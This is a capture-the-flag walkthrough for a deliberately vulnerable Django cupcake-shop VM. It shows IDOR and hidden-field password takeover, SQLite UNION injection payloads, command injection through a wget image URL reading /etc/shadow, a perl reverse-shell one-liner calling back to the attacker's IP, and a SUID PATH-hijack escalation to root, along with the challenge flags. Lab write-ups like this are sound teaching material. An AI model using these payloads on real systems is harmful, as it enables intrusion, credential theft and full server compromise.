# Intended Solutions for FoodPolar

## Setting up the webserver
The OVA file can be downloaded from here.
The credential is osboxes:osboxes.org

By default the virtualbox network setting is NAT network. 
Just set your kali machine to be NAT network too. 
Make sure both VMs are using the same network adapter. 
Try to ping each other before you begin.

Note: The ip addresses mentioned below may not be applicable to your configurations. 
You should know how to find out their respective IP addresses on your own.

![setup1]
From the above, we first nmap our server ip at 10.0.2.10 and found that it only has ssh open. 

![setup2]
Using the given credentials provided by us, we can ssh into osboxes@10.0.2.10 and start the web server by following the README file.

![setup3]
I have created a port forwarding to send incoming traffic at port 80 to 8000 so that I won't have to specify http://10.0.2.10:8000 everytime.


The web service is started running as www-data, a low privilege user.

## Attacking the web service.

![Signup]
Since we don't have any credentials from the web app, we can sign up as a legitimate user first.

test:t3st1234

![HomePage]
From the home page, we can see "edit profile", "change password", "add cupcake" links. These links seems interesting to look at. We also see a little "admin" link at the footer of the page.

![DjangoAdminLoginPage]
I am login as test and is not authorized to access the page. We can spend some time to bruteforce the password of admin or we can find another way.

We first look at "edit profile".

### Insecure Direct Object Reference / Web Parameter Tampering (Logical Attacks)

![EditProfile]
From the Edit User Profile page, we can see that in the url it uses id=3 to identify user. 

Let's try to change the number.

![DirectObjectReference1]
We successfully accessed the admin's profile page!

![AdminProfileFlag]
When we scroll down in the Home address field, we saw the flag
`JDC2017{9beff6eab8e169fd4acfe377902a6c480a8126b6}`

#### Why?
This is an insecure Direct Object Reference Vulnerability. Django tutorial online teaches beginners to use id parameters in url to pass data from one page to another. 

This is very similar to the usual GET request parameters ?id=1 in PHP language.

In this case, the programmer forgot to check the identity of the current user requesting for the data, leading to any authenticated users being able to access another user's personal information.

Next, we look at "add cupcake"

![addcupcake]
The image url looks like it allows user to put a url of an image so I went to google for a pretty image of a cupcake and place the url there.

![redvelvet]
The image I have chosen as a normal user.

![ErrorMessageLeaked]
When we view the cupcake, we see an error message that says "failed: Name or service not known. \nwget: unable to resolve host address \xe2\x80\x98..."

From this error message, a deduction can be made from the attacker point of view that wget was used to download an online image to the machine. Something similar to caching to local for better performance.

We shall keep a note of this for possible command injection or uploading of our own file to the webserver.

![HomePageCupcakeActions]
Going back to the home page, we can see "See Orders" for the cupcake we created. This seems interesting maybe the programmer also made the same Direct Object Reference mistake, allowing us to steal other people's business information.

![OrdersPage]
From the url, we see that the orders are access via an id again. 

![OrdersPageVulnFailed]
However, when we changed the id parameter, we failed to see the orders list from the admin user. 
The programmer has taken extra effort to check for the correct authenticated user, showing us "You are not allowed to access the info"

Next, we shall look at "change password" link.
Perhaps, the careless programmer forgot to secure the change password page and allow us to change other people's password?

### Insecure Authentication

![ChangePasswordPage]
Hmm, there is no id parameters specified in the url this time. Since, this is a form, we can check to see if there are any hidden fields that the programmer used to identify the user. 

![InspectElement1]
We can right click and inspect elements

![InspectElement2]
Alright! The programmer thought that by hiding the user_id in hidden field it would obscure the id parameter from the users. 

![ChangePasswordofOthers]
we can change remove the "type" attribute and make the user_id field unhidden. Then changing the id parameter from 3 to 2.

![PasswordUpdatedSuccessfully]
For me, I changed their password to the same as mine. t3st1234
It seems we updated someone else password successfully. Lets login into the user. But wait. What is the username?

![AllUsers]
From the all users, we can infer that the username is apple.

![AppleHomePage]
We have successfully signed in as Apple!

![AppleOrders]
When we go to see the orders of Chocolate Cupcake. We are allowed to view apple's business transactions. 
There is the flag `JDC2017{6cc8c09010dca141236fe1014e4adf7fc64cf42e}`

Let us also change the admin's password and see what we can do from the admin interface.

![AdminHome]
We managed to get into admin's Home Page. However, we don't see much things we can do here. Remember the separate admin login page we seen earlier?
Let us go back to the page again.

![DjangoAdmin]
Ah ha! The admin is authorized to look at the Django administration interface. Now we can see almost everything we want from this interface. 
The interface is also quite limited. After googling for a while on what I can do on the Django Admin interface. I realised that not all data are reflected here except if the models are registered under admin.py

![RedVelvetOnSales]
After correcting my image url from the admin interface (This can also be done via test's login). We can see that our cupcake image is loaded successfully on the sales section of index page.

Let us see what "All Cupcakes" link at the navbar do.

![AllCupcakes]
Just like "All Users", it lists all the available cupcakes in the database. However, there is an additional function "search" beside the title.

### SQL injection

![SearchPage]
It brings us to a search page. When I search with an empty string, it lists out all the cupcakes.

![SQLinjectable]
I proceeded to try to test an SQL injection by searching with a single quote. The search page throws us an error "OperationalError"

![SQLqueryLeaked]
By scrolling down to see the traceback message, we can clearly see partially the source code of `/var/www/JDC2017-webapp/foodpolar/cupcake/views.py`

```sql
"SELECT id, name, salesprice, usualprice, is_onsales FROM cupcake_cupcake WHERE name LIKE '" + keyword + "'")
```

We can see that the SQL query did not use any form of sanitization.
We can construct our SQL injection as the following

keyword=' union select 1,2,3,4,5; --

![SQLTableColumnsleaked]
From the above, we can see that column 2, 3 and 5 are visible to attacker.

lets try to see what version of sql is this by

keyword=' union select 1,@@version,3,4,5; --

Oops! Doesn't seems to be MySql... Lets look at the error messages in details. Perhaps it will tell us what database was used.

![SQLite3]
No wonder @@version didn't work. The underlying database is SQLite.
A quick googling leads to https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet
This allows for table and column enumerations but not that good to get a shell.

Since the previous flags are stored in database, we can also find their via SQL injections.
One might think of using SQLMap to automate SQL injection using POST request.

![InterceptPostRequest]
However Django has implemented a required CSRF middle ware token for any html form submission. 
![csrfcookie]
Reading up on Django's CSRF token, Django has a csrf cookie such that when a form page is generated for the current user, both the cookie and the csrf middleware token are used to confirm there is no CSRF attack going on. Thus, making automation slightly more challenging.

#### Table enumerations
![FoundSecretTable]
keyword=' union select 1,name,3,4,5 FROM sqlite_master WHERE type='table'; --

With the help of the cheatsheet, we managed to find a SECRETTABLE in the database using the above SQL injection.

#### Column enumerations
![FoundColumns]
keyword=' union select 1,name,sql,4,type FROM sqlite_master WHERE type='table' and name='SECRETTABLE'; --

Googling for finding out the columns of a table leads to https://stackoverflow.com/questions/685206/how-to-get-a-list-of-column-names

sqlite_master's column sql store the sql query used to create the table, hence showing us the column names too.

![SecretTableFlag]
keyword=' union select 1,flag, 3, 4, 5 from SECRETTABLE --

Lastly, we can select the flag from the SECRETTABLE to column 2 and we got the flag.
`JDC2017{229c3e2b19c8ae3a7450f5d60913c6d7467534b0}`

### Getting Remote Code Execution / Command Injection

Remember the wget error message was shown in the picture of the cupcake I added before?
![WhichStream]

I went to try out which stream does wget error goes by experimenting it on my kali.

In linux shell, there are 3 file descriptors. 

0: stdin

1: stdout

2: stderr

From the above screenshot, wget display error message on stderr.
We can't use ifconfig to test for RCE because ifconfig outputs on stdout.

From my practices, we can try the following 2 commands and see if it works.

stdout:		;cat /etc/passwd #
stderr:		;cat /etc/shadow #

![RCEProven1]

I tried a command injection with semicolon cat /etc/shadow as shown above and commented out the rest with a hex.

![RCEProven2]
When we view the cupcake, we see "Permission Denied" meaning we successfully done command injection.

#### Getting a shell

![ReverseShellOneLiner]
We can google for one liner reverse shell.
I personally like to use the perl reverse shell from pentestmonkey.

You can check if perl is on the machine via `;perl --help #` command injection

![SetupListener]
I find my own ip address and set up a simple netcat listener at port 4444.

```perl
perl -e 'use Socket;$i="10.0.2.13";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![ObtainedAShell]

By injecting the above perl command into the image url.
I successfully obtained a reverse shell from the webserver.

![webrootFlag]
Once I am inside, I proceed to explore the current home directory of the web root and found a hidden file called ".flag.txt"
`JDC2017{038b5b71bdc544ed9ea5e5ad03833cf696162e25}`

#### Search for more flags
![GrepForFlags]

I do a simple grep from the web root and found another flag in the source code of `./website/settings.py`
`JDC2017{69ed40d7f4df214b29630305f5fc7c51d69416ed}`

### Privilege Escalation

![CheckKernel]
Checking the kernel version via `uname` shows that the kernel version is very updated, 
meaning it is very difficult to find a kernel exploit to get root.

![SearchSUID]
Another way is by searching for SUID programs via find

We found an interesting program `/var/getdate`

![ThereisaSourceCode]
In the /var directory, the owner of `/var/getdate` is root and its permission is -rws for root. 
SUID program will run as the owner. Hence, if we can cause the program to spawn a shell, we get a root shell.
Conveniently, the programmer forgot to remove his source code getdate.c


```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	system("date");
	return 0;
}
```

From the source code, we see that it calls the date command.

#### PATH variable escalation
Since the date command runs without using full path, it means that it searches the environment variable $PATH for the binary file.
Supposed we wrote a shell spawning binary and name it exactly as 'date' and prepend the $PATH with a dot, `/var/getdate` will run any binary named as 'date' from the current directory first.

#### our own date.c

![ownDateSource]
We copy and paste the source code and instead of calling `date`, we call `/bin/sh`

![filetransfer1]
We set up a simple webserver on our kali for file transfer

![filetransfer2]
From the target's side, we download the date.c over to /var but was greeted with permission denied.
It's okay. /tmp directory is usually always world-writtable, thus we can download to /tmp instead.

![compilerun]
After transfering, compiling with gcc found on the server, we run our date and check that the shell works!

![PATHexploit]
We ran /var/getdate and got a shell but we are not root. 

Why? 
It is because in our binary we should also explicitly add setuid(0)

![setuidzero]
We added a few more lines, transfer and compile the binary over again. When we ran /var/getdate, we got a root shell!

![gotroot]
Once we got a root shell, we can go check out what /root directory has

![rootflag]
The root flag is found.
`JDC2017{026b0051fe74eaed5ae3401dc66ecf5b348779ea}`

Thank you. This is the end of the walkthrough.

[setup1]:images/setup1.png
[setup2]:images/setup2.png
[setup3]:images/setup3.png
[Signup]:images/Signup.png
[HomePage]:images/HomePage.png
[DjangoAdminLoginPage]:images/DjangoAdminLoginPage.png
[EditProfile]:images/EditProfile.png
[DirectObjectReference1]:images/DirectObjectReference1.png
[AdminProfileFlag]:images/AdminProfileFlag.png
[addcupcake]:images/addcupcake.png
[redvelvet]:images/redvelvet.png
[ErrorMessageLeaked]:images/ErrorMessageLeaked.png
[HomePageCupcakeActions]:images/HomePageCupcakeActions.png
[OrdersPage]:images/OrdersPage.png
[OrdersPageVulnFailed]:images/OrdersPageVulnFailed.png
[ChangePasswordPage]:images/ChangePasswordPage.png
[InspectElement1]:images/InspectElement1.png
[InspectElement2]:images/InspectElement2.png
[ChangePasswordofOthers]:images/ChangePasswordofOthers.png
[PasswordUpdatedSuccessfully]:images/PasswordUpdatedSuccessfully.png
[AllUsers]:images/AllUsers.png
[AppleHomePage]:images/AppleHomePage.png
[AppleOrders]:images/AppleOrders.png
[AdminHome]:images/AdminHome.png
[DjangoAdmin]:images/DjangoAdmin.png
[RedVelvetOnSales]:images/RedVelvetOnSales.png
[AllCupcakes]:images/AllCupcakes.png
[SearchPage]:images/SearchPage.png
[SQLinjectable]:images/SQLinjectable.png
[SQLqueryLeaked]:images/SQLqueryLeaked.png
[SQLTableColumnsleaked]:images/SQLTableColumnsleaked.png
[SQLite3]:images/SQLite3.png
[InterceptPostRequest]:images/InterceptPostRequest.png
[csrfcookie]:images/csrfcookie.png
[FoundSecretTable]:images/FoundSecretTable.png
[FoundColumns]:images/FoundColumns.png
[SecretTableFlag]:images/SecretTableFlag.png
[WhichStream]:images/WhichStream.png
[RCEProven1]:images/RCEProven1.png
[RCEProven2]:images/RCEProven2.png
[ReverseShellOneLiner]:images/ReverseShellOneLiner.png
[SetupListener]:images/SetupListener.png
[ObtainedAShell]:images/ObtainedAShell.png
[webrootFlag]:images/webrootFlag.png
[GrepForFlags]:images/GrepForFlags.png
[CheckKernel]:images/CheckKernel.png
[SearchSUID]:images/SearchSUID.png
[ThereisaSourceCode]:images/ThereisaSourceCode.png
[ownDateSource]:images/ownDateSource.png
[filetransfer1]:images/filetransfer1.png
[filetransfer2]:images/filetransfer2.png
[compilerun]:images/compilerun.png
[PATHexploit]:images/PATHexploit.png
[setuidzero]:images/setuidzero.png
[gotroot]:images/gotroot.png
[rootflag]:images/rootflag.png



